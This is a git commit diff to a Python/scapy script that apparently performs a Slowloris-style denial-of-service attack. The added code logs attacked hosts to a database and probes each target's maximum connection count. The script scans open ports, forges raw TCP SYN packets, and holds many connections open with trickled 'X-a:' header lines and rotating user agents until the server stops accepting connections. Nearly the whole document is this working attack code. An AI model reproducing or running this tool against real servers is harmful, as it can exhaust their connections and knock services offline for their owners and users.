e40b74737a135987373dd6725432f666f763f227
sabababoy <aleksandr19karmazin@gmail.com>
2020-05-10 16:30:40 -0500

    Added DB and some new featers

--- main.py
+++ main.py
@@ -5,6 +5,8 @@ import socket
 import random
 import asyncio
 import time
+import threading
+import sqlite3
 from scapy.all import *
 
 try:
@@ -12,17 +14,21 @@ try:
 except:
 	dst_ip = input('Enter IP: ')
 
+print('Attacked host: {}'.format(dst_ip))
+
 #src_ip = ''
 #dst_ip = ''
-connections = []
 
-p = IP(dst=dst_ip)/TCP(dport=8888, flags='S')
-r = sr1(p, verbose=False)
-src_ip = str(r[0].dst)
-sniffer = Sniffer_TCP.Sniffer(src_ip)
-print('Your ip: {}'.format(src_ip))
+conn = sqlite3.connect('database.db')
+cursor = conn.cursor()
+try:
+	cursor.execute("""CREATE TABLE checked_ip (host text, port text, max text) """)
+	print('Database was created')
+except:
+	pass
 
-
+open_ports = None
+maximum_connections = None
 user_agents = [
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
@@ -50,6 +56,25 @@ user_agents = [
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
 ]
+
+def check_max(dst_ip, dst_port):
+	t = time.time()
+	global maximum_connections
+	while True:
+		if time.time() - t >= 5:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.settimeout(5)
+			try:
+				s.connect((dst_ip, dst_port))
+				s.close()
+			except socket.timeout:
+				print('Maximum connections: {}'.format(len(connections)))
+				s.close()
+				maximum_connections = len(connections)
+				break
+			except:
+				continue
+			t = time.time()
 
 def ports_scanner(dst_ip):
 	print('Scanning open ports at {}...'.format(dst_ip))
@@ -91,16 +116,29 @@ async def send_syn():
 	global quantity_of_connections
 	global free_ports
 	global sniffer
+	global maximum_connections
+	global open_ports
 
+	if not dst_port and not open_ports:
+
+		open_ports = ports_scanner(dst_ip)
 	
-	open_ports = ports_scanner(dst_ip)
-	
-	while True:
-		dst_port = int(input('Which one (port)? '))
-		if dst_port not in open_ports:
-			print('{} is not open. Choose from: {}'.format(dst_port, open_ports))
-		else:
-			break
+		while True:
+			dst_port = int(input('Which one (port)? '))
+			if dst_port not in open_ports:
+				print('{} is not open. Choose from: {}'.format(dst_port, open_ports))
+			else:
+				open_ports.remove(dst_port)
+				break
+	elif open_ports and not dst_port:
+		while True:
+			print('Open ports: {}'.format(open_ports))
+			dst_port = int(input('Which one (port)? '))
+			if dst_port not in open_ports and open_ports:
+				print('{} is not open. Choose from: {}'.format(dst_port, open_ports))
+			else:
+				break
+
 
 	t = time.time()
 
@@ -121,7 +159,8 @@ async def send_syn():
 		free_ports.remove(src_port)
 		packet.src_port = src_port
 		await asyncio.sleep(0.01)
-	print('{} connections were made in {}'.format(x, time.time() - t))
+		if maximum_connections:
+			break
 
 
 async def connect():
@@ -133,6 +172,7 @@ async def connect():
 	global connections
 	global user_agents
 	global free_ports
+	global maximum_connections
 
 	ports = list()
 
@@ -179,6 +219,10 @@ async def connect():
 				
 			sniffer.TCP_stack.pop(0)
 
+		if maximum_connections:
+			sniffer.stop = True
+			break
+
 		await asyncio.sleep(0)
 
 async def keep_connection_open():
@@ -187,22 +231,28 @@ async def keep_connection_open():
 	global src_ip
 	global dst_ip
 	global dst_port
+	global maximum_connections
 	
 	while True:
-		if len(connections) != 0:
-			print('-------- {} CONNECTIONS KEEPING OPEN---------'.format(len(connections)))
+		if not maximum_connections:
+			if len(connections) != 0:
+				print('-------- {} CONNECTIONS KEEPING OPEN---------'.format(len(connections)))
 
-		t = time.time()
-		
-		for conn in connections:
-			packet = IP(dst=dst_ip)/TCP(sport=conn.src_port, dport=dst_port, flags='A', seq=conn.seq, ack=conn.ack)
-			data = ('X-a: {}\r\n'.format(random.randint(0, 5000)))
-			send(packet/data, verbose=False)
-			conn.seq += len(data)
-			await asyncio.sleep(0)
+			t = time.time()
+			
+			for conn in connections:
+				packet = IP(dst=dst_ip)/TCP(sport=conn.src_port, dport=dst_port, flags='A', seq=conn.seq, ack=conn.ack)
+				data = ('X-a: {}\r\n'.format(random.randint(0, 5000)))
+				send(packet/data, verbose=False)
+				conn.seq += len(data)
+				await asyncio.sleep(0)
 
-		if len(connections) != 0:
-			print('In time: {}'.format(time.time() - t))
+			if len(connections) != 0:
+				print('In time: {}'.format(time.time() - t))
+
+		if maximum_connections:
+			connections = []
+			break
 
 		await asyncio.sleep(10)
 		
@@ -221,7 +271,62 @@ async def main_loop():
 	await asyncio.gather(t1, t2, t3, t4)
 
 
-asyncio.run(main_loop())
+connections = []
+
+p = IP(dst=dst_ip)/TCP(dport=8888, flags='S')
+r = sr1(p, verbose=False, timeout=5)
+if r:
+	src_ip = str(r[0].dst)
+	sniffer = Sniffer_TCP.Sniffer(src_ip)
+else: # If you try to attack localhost server
+	src_ip = 'localhost'
+
+print('Your ip: {}'.format(src_ip))
+
+try:
+	dst_port = int(sys.argv[2])
+except:
+	open_ports = ports_scanner(dst_ip)
+	
+	while True:
+		dst_port = int(input('Which one (port)? '))
+		if dst_port not in open_ports:
+			print('{} is not open. Choose from: {}'.format(dst_port, open_ports))
+		else:
+			break
+
+print('Attacked port: {}'.format(dst_port))
+
+if __name__ == '__main__':
+	if dst_ip == 'localhost':
+		print('You try to reach smth unreachable (Program is not working with localhost. Try to start your server on VM)')
+	else:
+		while True:
+			if not maximum_connections:
+				thread = threading.Thread(target=check_max, args=(dst_ip, dst_port))
+				thread.start()
+				asyncio.run(main_loop())
+				while True:
+					if maximum_connections:
+						cursor.execute("INSERT INTO checked_ip (host, port, max) VALUES (?, ?, ?)", (dst_ip, str(dst_port), str(maximum_connections)))
+						conn.commit()
+						file = open('database_txt.txt', 'a+')
+						file.write('{} - {} - {}\n'.format(dst_ip, dst_port, maximum_connections))
+						file.close()
+						break
+			else:
+				x = input('Do you want to contionue (y/n)? ')
+				if x.lower() == 'y':
+					dst_port = None
+					maximum_connections = None
+					sniffer.stop = False
+					if not connections:
+						print('No more open ports.')
+						break
+				else:
+					break
+
+cursor.close()
 
 
 
